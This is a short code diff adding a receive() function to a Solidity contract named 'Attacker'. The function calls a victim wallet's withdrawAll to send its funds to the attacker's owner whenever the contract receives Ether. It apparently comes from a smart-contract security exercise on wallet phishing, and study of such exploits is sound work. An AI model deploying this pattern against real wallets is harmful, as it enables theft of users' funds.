@@ -14,5 +14,7 @@ contract Attacker is Ownable {
         smallWallet = _smallWallet;
     }
 
-    receive() external payable {}
+    receive() external payable {
+        smallWallet.withdrawAll(owner());
+    }
 }
